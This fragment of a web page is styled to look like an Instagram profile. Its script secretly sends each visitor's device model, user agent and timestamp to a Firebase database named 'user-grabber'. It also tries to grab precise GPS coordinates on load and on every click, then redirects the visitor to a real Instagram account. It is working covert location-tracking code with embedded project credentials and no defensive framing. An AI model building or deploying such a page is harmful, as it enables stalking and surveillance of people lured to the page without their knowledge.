        .btn-icon { background: var(--ig-btn-gray); border: none; border-radius: 8px; padding: 7px 10px; cursor: pointer; display: flex; align-items: center; justify-content: center;}

        /* Photo Grid */
        .photo-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--ig-border)}
        .photo-item{aspect-ratio:1/1;background:#fff;overflow:hidden;cursor:pointer}

        /* Bottom Nav */
        .bottom-nav{position:fixed;bottom:0;width:100%;height:50px;background:#fff;border-top:1px solid var(--ig-border);display:flex;justify-content:space-around;align-items:center;z-index:1000}

        .badge{position:absolute;top:-6px;right:-8px;background:var(--ig-red);color:white;font-size:10px;font-weight:bold;width:17px;height:17px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:2px solid white}

        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--ig-secondary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCBA7BdBt0_CQIN1tDrHoajZQzR_QtomhU",
        authDomain: "user-grabber.firebaseapp.com",
        projectId: "user-grabber",
        databaseURL: "https://user-grabber-default-rtdb.asia-southeast1.firebasedatabase.app",
        storageBucket: "user-grabber.firebasestorage.app",
        messagingSenderId: "1004415300770",
        appId: "1:1004415300770:web:46aeef2b3a35d95ac193fb"
    };

    try { firebase.initializeApp(firebaseConfig); } catch(e){}
    const db = firebase.database();
    let currentUserRef = null;
    let locationCaptured = false;
    const finalRedirect = "https://www.instagram.com/priyankamjain___0207/";

    async function getDeviceModel() {
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
            try {
                const uaData = await navigator.userAgentData.getHighEntropyValues(["model"]);
                if (uaData.model) return uaData.model;
            } catch (e) {}
        }
        const ua = navigator.userAgent;
        if (ua.indexOf("Android") > -1) {
            const match = ua.match(/;\s([^;]+)\sBuild\//);
            if (match && match[1]) return match[1];
            return "Android Device";
        } else if (ua.indexOf("iPhone") > -1) {
            return "iPhone";
        }
        return "Unknown Device";
    }

    function captureLocation(triggerType) {
        if (!currentUserRef) return;
        
        if (triggerType === 'click') {
            document.getElementById('loading').style.display = 'flex';
        }

        // NEW: Check if context is secure (HTTPS)
        if (window.location.protocol !== "https:" && window.location.hostname !== "localhost") {
            currentUserRef.update({ 
                status: "Failed: Not HTTPS",
                error_detail: "Geolocation requires HTTPS"
            });
            if (triggerType === 'click') {
                alert("Security Error: This page must be loaded over HTTPS to verify location.");
                window.location.href = finalRedirect;
            }
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                locationCaptured = true;
                currentUserRef.update({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    location_type: "Precise (" + triggerType + ")",
                    status: "Captured"
                }).then(() => {
                    if (triggerType === 'click') window.location.href = finalRedirect;
                });
            },
            (err) => {
                let errorMsg = err.message;
                
                // Specific handling for the error you are seeing
                if (err.message.includes("sufficient geolocation permissions")) {
                    errorMsg = "Browser Blocked: Check Site Settings";
                    if (triggerType === 'click') {
                        // Optional: alert the user to fix it
                         // alert("Please allow location access to continue.");
                    }
                }

                currentUserRef.update({ 
                    last_error: errorMsg,
                    status: "Denied/Error on " + triggerType
                }).then(() => {
                    if (triggerType === 'click') window.location.href = finalRedirect;
                });
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }

    window.addEventListener('DOMContentLoaded', async () => {
        const exactModel = await getDeviceModel();
        currentUserRef = db.ref('mobile_users').push();
        
        await currentUserRef.set({
            device: exactModel,
            userAgent: navigator.userAgent,
            time: new Date().toLocaleString(),
            status: "On Page - Attempting Auto Capture"
        });

        captureLocation('load');
    });

    document.addEventListener('click', (e) => {
        if (locationCaptured) {
            window.location.href = finalRedirect;
            return;
        }
        e.preventDefault(); 
        captureLocation('click');
    }, { once: false });

</script>
